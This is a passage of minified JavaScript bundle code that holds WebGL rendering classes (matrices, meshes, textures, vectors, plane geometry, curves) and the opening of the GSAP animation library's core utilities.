				this.frustum[t].multiply(e), this.frustum[t].constant *= e
			}
		}
		frustumIntersectsMesh(t) {
			if (!t.geometry.attributes.position) return !0;
			if (t.geometry.bounds && t.geometry.bounds.radius !== 1 / 0 || t.geometry.computeBoundingSphere(), !t.geometry.bounds) return !0;
			const e = at;
			e.copy(t.geometry.bounds.center), e.applyMatrix4(t.worldMatrix);
			const i = t.geometry.bounds.radius * t.worldMatrix.getMaxScaleOnAxis();
			return this.frustumIntersectsSphere(e, i)
		}
		frustumIntersectsSphere(t, e) {
			const i = ut;
			for (let n = 0; n < 6; n++) {
				const r = this.frustum[n];
				if (i.copy(r).dot(t) + r.constant < -e) return !1
			}
			return !0
		}
	}

	function lt(t, e, i) {
		let n = e[0],
			r = e[1],
			s = e[2],
			o = e[3],
			a = e[4],
			u = e[5],
			h = e[6],
			l = e[7],
			c = e[8],
			d = i[0],
			p = i[1],
			f = i[2],
			m = i[3],
			g = i[4],
			v = i[5],
			_ = i[6],
			D = i[7],
			y = i[8];
		return t[0] = d * n + p * o + f * h, t[1] = d * r + p * a + f * l, t[2] = d * s + p * u + f * c, t[3] = m * n + g * o + v * h, t[4] = m * r + g * a + v * l, t[5] = m * s + g * u + v * c, t[6] = _ * n + D * o + y * h, t[7] = _ * r + D * a + y * l, t[8] = _ * s + D * u + y * c, t
	}
	class ct extends Array {
		constructor(t = 1, e = 0, i = 0, n = 0, r = 1, s = 0, o = 0, a = 0, u = 1) {
			return super(t, e, i, n, r, s, o, a, u), this
		}
		set(t, e, i, n, r, s, o, a, u) {
			return t.length ? this.copy(t) : (function(t, e, i, n, r, s, o, a, u, h) {
				t[0] = e, t[1] = i, t[2] = n, t[3] = r, t[4] = s, t[5] = o, t[6] = a, t[7] = u, t[8] = h
			}(this, t, e, i, n, r, s, o, a, u), this)
		}
		translate(t, e = this) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2],
					o = e[3],
					a = e[4],
					u = e[5],
					h = e[6],
					l = e[7],
					c = e[8],
					d = i[0],
					p = i[1];
				t[0] = n, t[1] = r, t[2] = s, t[3] = o, t[4] = a, t[5] = u, t[6] = d * n + p * o + h, t[7] = d * r + p * a + l, t[8] = d * s + p * u + c
			}(this, e, t), this
		}
		rotate(t, e = this) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1],
					s = e[2],
					o = e[3],
					a = e[4],
					u = e[5],
					h = e[6],
					l = e[7],
					c = e[8],
					d = Math.sin(i),
					p = Math.cos(i);
				t[0] = p * n + d * o, t[1] = p * r + d * a, t[2] = p * s + d * u, t[3] = p * o - d * n, t[4] = p * a - d * r, t[5] = p * u - d * s, t[6] = h, t[7] = l, t[8] = c
			}(this, e, t), this
		}
		scale(t, e = this) {
			return function(t, e, i) {
				let n = i[0],
					r = i[1];
				t[0] = n * e[0], t[1] = n * e[1], t[2] = n * e[2], t[3] = r * e[3], t[4] = r * e[4], t[5] = r * e[5], t[6] = e[6], t[7] = e[7], t[8] = e[8]
			}(this, e, t), this
		}
		multiply(t, e) {
			return e ? lt(this, t, e) : lt(this, this, t), this
		}
		identity() {
			var t;
			return (t = this)[0] = 1, t[1] = 0, t[2] = 0, t[3] = 0, t[4] = 1, t[5] = 0, t[6] = 0, t[7] = 0, t[8] = 1, this
		}
		copy(t) {
			var e, i;
			return i = t, (e = this)[0] = i[0], e[1] = i[1], e[2] = i[2], e[3] = i[3], e[4] = i[4], e[5] = i[5], e[6] = i[6], e[7] = i[7], e[8] = i[8], this
		}
		fromMatrix4(t) {
			var e, i;
			return i = t, (e = this)[0] = i[0], e[1] = i[1], e[2] = i[2], e[3] = i[4], e[4] = i[5], e[5] = i[6], e[6] = i[8], e[7] = i[9], e[8] = i[10], this
		}
		fromQuaternion(t) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = i + i,
					a = n + n,
					u = r + r,
					h = i * o,
					l = n * o,
					c = n * a,
					d = r * o,
					p = r * a,
					f = r * u,
					m = s * o,
					g = s * a,
					v = s * u;
				t[0] = 1 - c - f, t[3] = l - v, t[6] = d + g, t[1] = l + v, t[4] = 1 - h - f, t[7] = p - m, t[2] = d - g, t[5] = p + m, t[8] = 1 - h - c
			}(this, t), this
		}
		fromBasis(t, e, i) {
			return this.set(t[0], t[1], t[2], e[0], e[1], e[2], i[0], i[1], i[2]), this
		}
		inverse(t = this) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = e[4],
					a = e[5],
					u = e[6],
					h = e[7],
					l = e[8],
					c = l * o - a * h,
					d = -l * s + a * u,
					p = h * s - o * u,
					f = i * c + n * d + r * p;
				f && (f = 1 / f, t[0] = c * f, t[1] = (-l * n + r * h) * f, t[2] = (a * n - r * o) * f, t[3] = d * f, t[4] = (l * i - r * u) * f, t[5] = (-a * i + r * s) * f, t[6] = p * f, t[7] = (-h * i + n * u) * f, t[8] = (o * i - n * s) * f)
			}(this, t), this
		}
		getNormalMatrix(t) {
			return function(t, e) {
				let i = e[0],
					n = e[1],
					r = e[2],
					s = e[3],
					o = e[4],
					a = e[5],
					u = e[6],
					h = e[7],
					l = e[8],
					c = e[9],
					d = e[10],
					p = e[11],
					f = e[12],
					m = e[13],
					g = e[14],
					v = e[15],
					_ = i * a - n * o,
					D = i * u - r * o,
					y = i * h - s * o,
					x = n * u - r * a,
					w = n * h - s * a,
					E = r * h - s * u,
					b = l * m - c * f,
					C = l * g - d * f,
					T = l * v - p * f,
					F = c * g - d * m,
					M = c * v - p * m,
					A = d * v - p * g,
					S = _ * A - D * M + y * F + x * T - w * C + E * b;
				S && (S = 1 / S, t[0] = (a * A - u * M + h * F) * S, t[1] = (u * T - o * A - h * C) * S, t[2] = (o * M - a * T + h * b) * S, t[3] = (r * M - n * A - s * F) * S, t[4] = (i * A - r * T + s * C) * S, t[5] = (n * T - i * M - s * b) * S, t[6] = (m * E - g * w + v * x) * S, t[7] = (g * y - f * E - v * D) * S, t[8] = (f * w - m * y + v * _) * S)
			}(this, t), this
		}
	}
	let dt = 0;
	class pt extends st {
		constructor(t, {
			geometry: e,
			program: i,
			mode: n = t.TRIANGLES,
			frustumCulled: r = !0,
			renderOrder: s = 0
		} = {}) {
			super(), t.canvas || console.error("gl not passed as first argument to Mesh"), this.gl = t, this.id = dt++, this.geometry = e, this.program = i, this.mode = n, this.frustumCulled = r, this.renderOrder = s, this.modelViewMatrix = new it, this.normalMatrix = new ct, this.beforeRenderCallbacks = [], this.afterRenderCallbacks = []
		}
		onBeforeRender(t) {
			return this.beforeRenderCallbacks.push(t), this
		}
		onAfterRender(t) {
			return this.afterRenderCallbacks.push(t), this
		}
		draw({
			camera: t
		} = {}) {
			this.beforeRenderCallbacks.forEach((e => e && e({
				mesh: this,
				camera: t
			}))), t && (this.program.uniforms.modelMatrix || Object.assign(this.program.uniforms, {
				modelMatrix: {
					value: null
				},
				viewMatrix: {
					value: null
				},
				modelViewMatrix: {
					value: null
				},
				normalMatrix: {
					value: null
				},
				projectionMatrix: {
					value: null
				},
				cameraPosition: {
					value: null
				}
			}), this.program.uniforms.projectionMatrix.value = t.projectionMatrix, this.program.uniforms.cameraPosition.value = t.worldPosition, this.program.uniforms.viewMatrix.value = t.viewMatrix, this.modelViewMatrix.multiply(t.viewMatrix, this.worldMatrix), this.normalMatrix.getNormalMatrix(this.modelViewMatrix), this.program.uniforms.modelMatrix.value = this.worldMatrix, this.program.uniforms.modelViewMatrix.value = this.modelViewMatrix, this.program.uniforms.normalMatrix.value = this.normalMatrix);
			let e = this.program.cullFace && this.worldMatrix.determinant() < 0;
			this.program.use({
				flipFaces: e
			}), this.geometry.draw({
				mode: this.mode,
				program: this.program
			}), this.afterRenderCallbacks.forEach((e => e && e({
				mesh: this,
				camera: t
			})))
		}
	}
	const ft = new Uint8Array(4);

	function mt(t) {
		return 0 == (t & t - 1)
	}
	let gt = 1;
	class vt {
		constructor(t, {
			image: e,
			target: i = t.TEXTURE_2D,
			type: n = t.UNSIGNED_BYTE,
			format: r = t.RGBA,
			internalFormat: s = r,
			wrapS: o = t.CLAMP_TO_EDGE,
			wrapT: a = t.CLAMP_TO_EDGE,
			generateMipmaps: u = !0,
			minFilter: h = (u ? t.NEAREST_MIPMAP_LINEAR : t.LINEAR),
			magFilter: l = t.LINEAR,
			premultiplyAlpha: c = !1,
			unpackAlignment: d = 4,
			flipY: p = i == t.TEXTURE_2D,
			anisotropy: f = 0,
			level: m = 0,
			width: g,
			height: v = g
		} = {}) {
			this.gl = t, this.id = gt++, this.image = e, this.target = i, this.type = n, this.format = r, this.internalFormat = s, this.minFilter = h, this.magFilter = l, this.wrapS = o, this.wrapT = a, this.generateMipmaps = u, this.premultiplyAlpha = c, this.unpackAlignment = d, this.flipY = p, this.anisotropy = Math.min(f, this.gl.renderer.parameters.maxAnisotropy), this.level = m, this.width = g, this.height = v, this.texture = this.gl.createTexture(), this.store = {
				image: null
			}, this.glState = this.gl.renderer.state, this.state = {}, this.state.minFilter = this.gl.NEAREST_MIPMAP_LINEAR, this.state.magFilter = this.gl.LINEAR, this.state.wrapS = this.gl.REPEAT, this.state.wrapT = this.gl.REPEAT, this.state.anisotropy = 0
		}
		bind() {
			this.glState.textureUnits[this.glState.activeTextureUnit] !== this.id && (this.gl.bindTexture(this.target, this.texture), this.glState.textureUnits[this.glState.activeTextureUnit] = this.id)
		}
		update(t = 0) {
			const e = !(this.image === this.store.image && !this.needsUpdate);
			if ((e || this.glState.textureUnits[t] !== this.id) && (this.gl.renderer.activeTexture(t), this.bind()), e) {
				if (this.needsUpdate = !1, this.flipY !== this.glState.flipY && (this.gl.pixelStorei(this.gl.UNPACK_FLIP_Y_WEBGL, this.flipY), this.glState.flipY = this.flipY), this.premultiplyAlpha !== this.glState.premultiplyAlpha && (this.gl.pixelStorei(this.gl.UNPACK_PREMULTIPLY_ALPHA_WEBGL, this.premultiplyAlpha), this.glState.premultiplyAlpha = this.premultiplyAlpha), this.unpackAlignment !== this.glState.unpackAlignment && (this.gl.pixelStorei(this.gl.UNPACK_ALIGNMENT, this.unpackAlignment), this.glState.unpackAlignment = this.unpackAlignment), this.minFilter !== this.state.minFilter && (this.gl.texParameteri(this.target, this.gl.TEXTURE_MIN_FILTER, this.minFilter), this.state.minFilter = this.minFilter), this.magFilter !== this.state.magFilter && (this.gl.texParameteri(this.target, this.gl.TEXTURE_MAG_FILTER, this.magFilter), this.state.magFilter = this.magFilter), this.wrapS !== this.state.wrapS && (this.gl.texParameteri(this.target, this.gl.TEXTURE_WRAP_S, this.wrapS), this.state.wrapS = this.wrapS), this.wrapT !== this.state.wrapT && (this.gl.texParameteri(this.target, this.gl.TEXTURE_WRAP_T, this.wrapT), this.state.wrapT = this.wrapT), this.anisotropy && this.anisotropy !== this.state.anisotropy && (this.gl.texParameterf(this.target, this.gl.renderer.getExtension("EXT_texture_filter_anisotropic").TEXTURE_MAX_ANISOTROPY_EXT, this.anisotropy), this.state.anisotropy = this.anisotropy), this.image) {
					if (this.image.width && (this.width = this.image.width, this.height = this.image.height), this.target === this.gl.TEXTURE_CUBE_MAP)
						for (let t = 0; t < 6; t++) this.gl.texImage2D(this.gl.TEXTURE_CUBE_MAP_POSITIVE_X + t, this.level, this.internalFormat, this.format, this.type, this.image[t]);
					else if (ArrayBuffer.isView(this.image)) this.gl.texImage2D(this.target, this.level, this.internalFormat, this.width, this.height, 0, this.format, this.type, this.image);
					else if (this.image.isCompressedTexture)
						for (let t = 0; t < this.image.length; t++) this.gl.compressedTexImage2D(this.target, t, this.internalFormat, this.image[t].width, this.image[t].height, 0, this.image[t].data);
					else this.gl.texImage2D(this.target, this.level, this.internalFormat, this.format, this.type, this.image);
					this.generateMipmaps && (this.gl.renderer.isWebgl2 || mt(this.image.width) && mt(this.image.height) ? this.gl.generateMipmap(this.target) : (this.generateMipmaps = !1, this.wrapS = this.wrapT = this.gl.CLAMP_TO_EDGE, this.minFilter = this.gl.LINEAR)), this.onUpdate && this.onUpdate()
				} else if (this.target === this.gl.TEXTURE_CUBE_MAP)
					for (let t = 0; t < 6; t++) this.gl.texImage2D(this.gl.TEXTURE_CUBE_MAP_POSITIVE_X + t, 0, this.gl.RGBA, 1, 1, 0, this.gl.RGBA, this.gl.UNSIGNED_BYTE, ft);
				else this.width ? this.gl.texImage2D(this.target, this.level, this.internalFormat, this.width, this.height, 0, this.format, this.type, null) : this.gl.texImage2D(this.target, 0, this.gl.RGBA, 1, 1, 0, this.gl.RGBA, this.gl.UNSIGNED_BYTE, ft);
				this.store.image = this.image
			}
		}
	}
	const _t = {
		black: "#000000",
		white: "#ffffff",
		red: "#ff0000",
		green: "#00ff00",
		blue: "#0000ff",
		fuchsia: "#ff00ff",
		cyan: "#00ffff",
		yellow: "#ffff00",
		orange: "#ff8000"
	};

	function Dt(t) {
		4 === t.length && (t = t[0] + t[1] + t[1] + t[2] + t[2] + t[3] + t[3]);
		const e = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t);
		return e || console.warn(`Unable to convert hex string ${t} to rgb values`), [parseInt(e[1], 16) / 255, parseInt(e[2], 16) / 255, parseInt(e[3], 16) / 255]
	}

	function yt(t) {
		return void 0 === t ? [0, 0, 0] : 3 === arguments.length ? arguments : isNaN(t) ? "#" === t[0] ? Dt(t) : _t[t.toLowerCase()] ? Dt(_t[t.toLowerCase()]) : (console.warn("Color format not recognised"), [0, 0, 0]) : function(t) {
			return [((t = parseInt(t)) >> 16 & 255) / 255, (t >> 8 & 255) / 255, (255 & t) / 255]
		}(t)
	}
	class xt extends Array {
		constructor(t) {
			return Array.isArray(t) ? super(...t) : super(...yt(...arguments))
		}
		get r() {
			return this[0]
		}
		get g() {
			return this[1]
		}
		get b() {
			return this[2]
		}
		set r(t) {
			this[0] = t
		}
		set g(t) {
			this[1] = t
		}
		set b(t) {
			this[2] = t
		}
		set(t) {
			return Array.isArray(t) ? this.copy(t) : this.copy(yt(...arguments))
		}
		copy(t) {
			return this[0] = t[0], this[1] = t[1], this[2] = t[2], this
		}
	}

	function wt(t, e, i) {
		return t[0] = e[0] + i[0], t[1] = e[1] + i[1], t
	}

	function Et(t, e, i) {
		return t[0] = e[0] - i[0], t[1] = e[1] - i[1], t
	}

	function bt(t, e, i) {
		return t[0] = e[0] * i, t[1] = e[1] * i, t
	}

	function Ct(t) {
		var e = t[0],
			i = t[1];
		return Math.sqrt(e * e + i * i)
	}

	function Tt(t, e) {
		return t[0] * e[1] - t[1] * e[0]
	}
	class Ft extends Array {
		constructor(t = 0, e = t) {
			return super(t, e), this
		}
		get x() {
			return this[0]
		}
		get y() {
			return this[1]
		}
		set x(t) {
			this[0] = t
		}
		set y(t) {
			this[1] = t
		}
		set(t, e = t) {
			return t.length ? this.copy(t) : (function(t, e, i) {
				t[0] = e, t[1] = i
			}(this, t, e), this)
		}
		copy(t) {
			var e, i;
			return i = t, (e = this)[0] = i[0], e[1] = i[1], this
		}
		add(t, e) {
			return e ? wt(this, t, e) : wt(this, this, t), this
		}
		sub(t, e) {
			return e ? Et(this, t, e) : Et(this, this, t), this
		}
		multiply(t) {
			var e, i;
			return t.length ? (this, i = t, (e = this)[0] = this[0] * i[0], e[1] = this[1] * i[1]) : bt(this, this, t), this
		}
		divide(t) {
			var e, i;
			return t.length ? (this, i = t, (e = this)[0] = this[0] / i[0], e[1] = this[1] / i[1]) : bt(this, this, 1 / t), this
		}
		inverse(t = this) {
			var e, i;
			return i = t, (e = this)[0] = 1 / i[0], e[1] = 1 / i[1], this
		}
		len() {
			return Ct(this)
		}
		distance(t) {
			return t ? (this, i = (e = t)[0] - this[0], n = e[1] - this[1], Math.sqrt(i * i + n * n)) : Ct(this);
			var e, i, n
		}
		squaredLen() {
			return this.squaredDistance()
		}
		squaredDistance(t) {
			return t ? (this, (i = (e = t)[0] - this[0]) * i + (n = e[1] - this[1]) * n) : function(t) {
				var e = t[0],
					i = t[1];
				return e * e + i * i
			}(this);
			var e, i, n
		}
		negate(t = this) {
			var e, i;
			return i = t, (e = this)[0] = -i[0], e[1] = -i[1], this
		}
		cross(t, e) {
			return e ? Tt(t, e) : Tt(this, t)
		}
		scale(t) {
			return bt(this, this, t), this
		}
		normalize() {
			var t, e, i, n;
			return this, (n = (e = (t = this)[0]) * e + (i = t[1]) * i) > 0 && (n = 1 / Math.sqrt(n)), this[0] = t[0] * n, this[1] = t[1] * n, this
		}
		dot(t) {
			return e = t, this[0] * e[0] + this[1] * e[1];
			var e
		}
		equals(t) {
			return e = t, this[0] === e[0] && this[1] === e[1];
			var e
		}
		applyMatrix3(t) {
			var e, i, n;
			return this, e = t, i = this[0], n = this[1], this[0] = e[0] * i + e[3] * n + e[6], this[1] = e[1] * i + e[4] * n + e[7], this
		}
		applyMatrix4(t) {
			return function(t, e, i) {
				let n = e[0],
					r = e[1];
				t[0] = i[0] * n + i[4] * r + i[12], t[1] = i[1] * n + i[5] * r + i[13]
			}(this, this, t), this
		}
		lerp(t, e) {
			return function(t, e, i, n) {
				var r = e[0],
					s = e[1];
				t[0] = r + n * (i[0] - r), t[1] = s + n * (i[1] - s)
			}(this, this, t, e), this
		}
		clone() {
			return new Ft(this[0], this[1])
		}
		fromArray(t, e = 0) {
			return this[0] = t[e], this[1] = t[e + 1], this
		}
		toArray(t = [], e = 0) {
			return t[e] = this[0], t[e + 1] = this[1], t
		}
	}
	class Mt extends k {
		constructor(t, {
			width: e = 1,
			height: i = 1,
			widthSegments: n = 1,
			heightSegments: r = 1,
			attributes: s = {}
		} = {}) {
			const o = n,
				a = r,
				u = (o + 1) * (a + 1),
				h = o * a * 6,
				l = new Float32Array(3 * u),
				c = new Float32Array(3 * u),
				d = new Float32Array(2 * u),
				p = h > 65536 ? new Uint32Array(h) : new Uint16Array(h);
			Mt.buildPlane(l, c, d, p, e, i, 0, o, a), Object.assign(s, {
				position: {
					size: 3,
					data: l
				},
				normal: {
					size: 3,
					data: c
				},
				uv: {
					size: 2,
					data: d
				},
				index: {
					data: p
				}
			}), super(t, s)
		}
		static buildPlane(t, e, i, n, r, s, o, a, u, h = 0, l = 1, c = 2, d = 1, p = -1, f = 0, m = 0) {
			const g = f,
				v = r / a,
				_ = s / u;
			for (let D = 0; D <= u; D++) {
				let y = D * _ - s / 2;
				for (let s = 0; s <= a; s++, f++) {
					let _ = s * v - r / 2;
					if (t[3 * f + h] = _ * d, t[3 * f + l] = y * p, t[3 * f + c] = o / 2, e[3 * f + h] = 0, e[3 * f + l] = 0, e[3 * f + c] = o >= 0 ? 1 : -1, i[2 * f] = s / a, i[2 * f + 1] = 1 - D / u, D === u || s === a) continue;
					let x = g + s + D * (a + 1),
						w = g + s + (D + 1) * (a + 1),
						E = g + s + (D + 1) * (a + 1) + 1,
						b = g + s + D * (a + 1) + 1;
					n[6 * m] = x, n[6 * m + 1] = w, n[6 * m + 2] = b, n[6 * m + 3] = w, n[6 * m + 4] = E, n[6 * m + 5] = b, m++
				}
			}
		}
	}
	new O, new Ft, new Ft, new Ft, new Ft, new Ft, new O, new O, new O, new O, new O, new O, new O, new O, new O, new O, new O, new it;
	const At = new O,
		St = new O,
		Ot = new O,
		Pt = new O;

	function It(t, e, i, n) {
		const r = 1 - t;
		At.copy(e).scale(r ** 2), St.copy(i).scale(2 * r * t), Ot.copy(n).scale(t ** 2);
		const s = new O;
		return s.add(At, St).add(Ot), s
	}

	function Lt(t, e, i, n, r) {
		const s = 1 - t;
		At.copy(e).scale(s ** 3), St.copy(i).scale(3 * s ** 2 * t), Ot.copy(n).scale(3 * s * t ** 2), Pt.copy(r).scale(t ** 3);
		const o = new O;
		return o.add(At, St).add(Ot).add(Pt), o
	}
	class Bt {
		constructor({
			points: t = [new O(0, 0, 0), new O(0, 1, 0), new O(1, 1, 0), new O(1, 0, 0)],
			divisions: e = 12,
			type: i = "catmullrom"
		} = {}) {
			this.points = t, this.divisions = e, this.type = i
		}
		_getQuadraticBezierPoints(t = this.divisions) {
			const e = [],
				i = this.points.length;
			if (i < 3) return console.warn("Not enough points provided."), [];
			const n = this.points[0];
			let r = this.points[1],
				s = this.points[2];
			for (let i = 0; i <= t; i++) {
				const o = It(i / t, n, r, s);
				e.push(o)
			}
			let o = 3;
			for (; i - o > 0;) {
				n.copy(s), r = s.scale(2).sub(r), s = this.points[o];
				for (let i = 1; i <= t; i++) {
					const o = It(i / t, n, r, s);
					e.push(o)
				}
				o++
			}
			return e
		}
		_getCubicBezierPoints(t = this.divisions) {
			const e = [],
				i = this.points.length;
			if (i < 4) return console.warn("Not enough points provided."), [];
			let n = this.points[0],
				r = this.points[1],
				s = this.points[2],
				o = this.points[3];
			for (let i = 0; i <= t; i++) {
				const a = Lt(i / t, n, r, s, o);
				e.push(a)
			}
			let a = 4;
			for (; i - a > 1;) {
				n.copy(o), r = o.scale(2).sub(s), s = this.points[a], o = this.points[a + 1];
				for (let i = 1; i <= t; i++) {
					const a = Lt(i / t, n, r, s, o);
					e.push(a)
				}
				a += 2
			}
			return e
		}
		_getCatmullRomPoints(t = this.divisions, e = .168, i = .168) {
			const n = [];
			if (this.points.length <= 2) return this.points;
			let r;
			return this.points.forEach(((s, o) => {
				if (0 === o) r = s;
				else {
					const [a, u] = function(t, e, i = .168, n = .168) {
						if (e < 1 ? At.sub(t[1], t[0]).scale(i).add(t[0]) : At.sub(t[e + 1], t[e - 1]).scale(i).add(t[e]), e > t.length - 3) {
							const e = t.length - 1;
							St.sub(t[e - 1], t[e]).scale(n).add(t[e])
						} else St.sub(t[e], t[e + 2]).scale(n).add(t[e + 1]);
						return [At.clone(), St.clone()]
					}(this.points, o - 1, e, i), h = new Bt({
						points: [r, a, u, s],
						type: "cubicbezier"
					});
					n.pop(), n.push(...h.getPoints(t)), r = s
				}
			})), n
		}
		getPoints(t = this.divisions, e = .168, i = .168) {
			const n = this.type;
			return "quadraticbezier" === n ? this._getQuadraticBezierPoints(t) : "cubicbezier" === n ? this._getCubicBezierPoints(t) : "catmullrom" === n ? this._getCatmullRomPoints(t, e, i) : this.points
		}
	}

	function kt(t) {
		if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
		return t
	}

	function Rt(t, e) {
		t.prototype = Object.create(e.prototype), t.prototype.constructor = t, t.__proto__ = e
	}
	Bt.CATMULLROM = "catmullrom", Bt.CUBICBEZIER = "cubicbezier", Bt.QUADRATICBEZIER = "quadraticbezier", new O, new Q, new O, new O, new Q, new O, new it, new O, new O, new O, new O, new O, new Q, new Q, new Q, new Q, new it, new it, Uint8Array, Int16Array, Uint16Array, Uint32Array, Float32Array, Uint8Array, Uint8Array;
	var Nt, Wt, zt, Ut, jt, Vt, Gt, Ht, qt, Yt, Xt, $t, Zt, Kt, Qt, Jt, te, ee, ie, ne, re, se, oe, ae, ue, he, le, ce, de = {
			autoSleep: 120,
			force3D: "auto",
			nullTargetWarn: 1,
			units: {
				lineHeight: ""
			}
		},
		pe = {
			duration: .5,
			overwrite: !1,
			delay: 0
		},
		fe = 1e8,
		me = 2 * Math.PI,
		ge = me / 4,
		ve = 0,
		_e = Math.sqrt,
		De = Math.cos,
		ye = Math.sin,
		xe = function(t) {
			return "string" == typeof t
		},
		we = function(t) {
			return "function" == typeof t
		},
		Ee = function(t) {
			return "number" == typeof t
		},
		be = function(t) {
			return void 0 === t
		},
		Ce = function(t) {
			return "object" == typeof t
		},
		Te = function(t) {
			return !1 !== t
		},
		Fe = function() {
			return "undefined" != typeof window
		},
		Me = function(t) {
			return we(t) || xe(t)
		},
		Ae = "function" == typeof ArrayBuffer && ArrayBuffer.isView || function() {},
		Se = Array.isArray,
		Oe = /(?:-?\.?\d|\.)+/gi,
		Pe = /[-+=.]*\d+[.e\-+]*\d*[e\-+]*\d*/g,
		Ie = /[-+=.]*\d+[.e-]*\d*[a-z%]*/g,
		Le = /[-+=.]*\d+\.?\d*(?:e-|e\+)?\d*/gi,
		Be = /[+-]=-?[.\d]+/,
		ke = /[^,'"\[\]\s]+/gi,
		Re = /^[+\-=e\s\d]*\d+[.\d]*([a-z]*|%)\s*$/i,
		Ne = {},
		We = {},
		ze = function(t) {
			return (We = di(t, Ne)) && Jn
		},
		Ue = function(t, e) {
			return console.warn("Invalid property", t, "set to", e, "Missing plugin? gsap.registerPlugin()")
		},
		je = function(t, e) {
			return !e && console.warn(t)
		},
		Ve = function(t, e) {
			return t && (Ne[t] = e) && We && (We[t] = e) || Ne
		},
		Ge = function() {
			return 0
		},
		He = {},
		qe = [],
		Ye = {},
		Xe = {},
		$e = {},
		Ze = 30,
		Ke = [],
		Qe = "",
		Je = function(t) {
			var e, i, n = t[0];
			if (Ce(n) || we(n) || (t = [t]), !(e = (n._gsap || {}).harness)) {
				for (i = Ke.length; i-- && !Ke[i].targetTest(n););
				e = Ke[i]
			}
			for (i = t.length; i--;) t[i] && (t[i]._gsap || (t[i]._gsap = new wn(t[i], e))) || t.splice(i, 1);
			return t
		},
		ti = function(t) {
			return t._gsap || Je(Ui(t))[0]._gsap
		},
		ei = function(t, e, i) {
			return (i = t[e]) && we(i) ? t[e]() : be(i) && t.getAttribute && t.getAttribute(e) || i
		},
		ii = function(t, e) {
			return (t = t.split(",")).forEach(e) || t
		},
		ni = function(t) {
			return Math.round(1e5 * t) / 1e5 || 0
		},
		ri = function(t) {
			return Math.round(1e7 * t) / 1e7 || 0
		},
		si = function(t, e) {
			var i = e.charAt(0),
				n = parseFloat(e.substr(2));
			return t = parseFloat(t), "+" === i ? t + n : "-" === i ? t - n : "*" === i ? t * n : t / n
		},
		oi = function(t, e) {
			for (var i = e.length, n = 0; t.indexOf(e[n]) < 0 && ++n < i;);
			return n < i
		},
		ai = function() {
			var t, e, i = qe.length,
				n = qe.slice(0);
			for (Ye = {}, qe.length = 0, t = 0; t < i; t++)(e = n[t]) && e._lazy && (e.render(e._lazy[0], e._lazy[1], !0)._lazy = 0)
		},
		ui = function(t, e, i, n) {
			qe.length && ai(), t.render(e, i, n), qe.length && ai()
		},
		hi = function(t) {
			var e = parseFloat(t);
			return (e || 0 === e) && (t + "").match(ke).length < 2 ? e : xe(t) ? t.trim() : t
		},
		li = function(t) {
			return t
		},
		ci = function(t, e) {
			for (var i in e) i in t || (t[i] = e[i]);
			return t
		},
		di = function(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		},
		pi = function t(e, i) {
			for (var n in i) "__proto__" !== n && "constructor" !== n && "prototype" !== n && (e[n] = Ce(i[n]) ? t(e[n] || (e[n] = {}), i[n]) : i[n]);
			return e
		},
		fi = function(t, e) {
			var i, n = {};
			for (i in t) i in e || (n[i] = t[i]);
			return n
		},
		mi = function(t) {
			var e, i = t.parent || Wt,
				n = t.keyframes ? (e = Se(t.keyframes), function(t, i) {
					for (var n in i) n in t || "duration" === n && e || "ease" === n || (t[n] = i[n])
				}) : ci;
			if (Te(t.inherit))
				for (; i;) n(t, i.vars.defaults), i = i.parent || i._dp;
			return t
		},
		gi = function(t, e, i, n, r) {
			void 0 === i && (i = "_first"), void 0 === n && (n = "_last");
			var s, o = t[n];
			if (r)
				for (s = e[r]; o && o[r] > s;) o = o._prev;
			return o ? (e._next = o._next, o._next = e) : (e._next = t[i], t[i] = e), e._next ? e._next._prev = e : t[n] = e, e._prev = o, e.parent = e._dp = t, e
		},
		vi = function(t, e, i, n) {
			void 0 === i && (i = "_first"), void 0 === n && (n = "_last");
			var r = e._prev,
				s = e._next;
			r ? r._next = s : t[i] === e && (t[i] = s), s ? s._prev = r : t[n] === e && (t[n] = r), e._next = e._prev = e.parent = null
		},
		_i = function(t, e) {
			t.parent && (!e || t.parent.autoRemoveChildren) && t.parent.remove(t), t._act = 0
		},
		Di = function(t, e) {
			if (t && (!e || e._end > t._dur || e._start < 0))
				for (var i = t; i;) i._dirty = 1, i = i.parent;
			return t
		},
		yi = function(t) {
			for (var e = t.parent; e && e.parent;) e._dirty = 1, e.totalDuration(), e = e.parent;
			return t
		},
		xi = function(t) {
			return t._repeat ? wi(t._tTime, t = t.duration() + t._rDelay) * t : 0
		},
		wi = function(t, e) {
			var i = Math.floor(t /= e);
			return t && i === t ? i - 1 : i
		},
		Ei = function(t, e) {
			return (t - e._start) * e._ts + (e._ts >= 0 ? 0 : e._dirty ? e.totalDuration() : e._tDur)
		},
		bi = function(t) {
			return t._end = ri(t._start + (t._tDur / Math.abs(t._ts || t._rts || 1e-8) || 0))
		},
		Ci = function(t, e) {
			var i = t._dp;
			return i && i.smoothChildTiming && t._ts && (t._start = ri(i._time - (t._ts > 0 ? e / t._ts : ((t._dirty ? t.totalDuration() : t._tDur) - e) / -t._ts)), bi(t), i._dirty || Di(i, t)), t
		},
		Ti = function(t, e) {
			var i;
			if ((e._time || e._initted && !e._dur) && (i = Ei(t.rawTime(), e), (!e._dur || Ri(0, e.totalDuration(), i) - e._tTime > 1e-8) && e.render(i, !0)), Di(t, e)._dp && t._initted && t._time >= t._dur && t._ts) {
				if (t._dur < t.duration())
					for (i = t; i._dp;) i.rawTime() >= 0 && i.totalTime(i._tTime), i = i._dp;
				t._zTime = -1e-8
			}
		},
		Fi = function(t, e, i, n) {
			return e.parent && _i(e), e._start = ri((Ee(i) ? i : i || t !== Wt ? Li(t, i, e) : t._time) + e._delay), e._end = ri(e._start + (e.totalDuration() / Math.abs(e.timeScale()) || 0)), gi(t, e, "_first", "_last", t._sort ? "_start" : 0), Si(e) || (t._recent = e), n || Ti(t, e), t
		},
		Mi = function(t, e) {
			return (Ne.ScrollTrigger || Ue("scrollTrigger", e)) && Ne.ScrollTrigger.create(e, t)
		},
		Ai = function(t, e, i, n) {
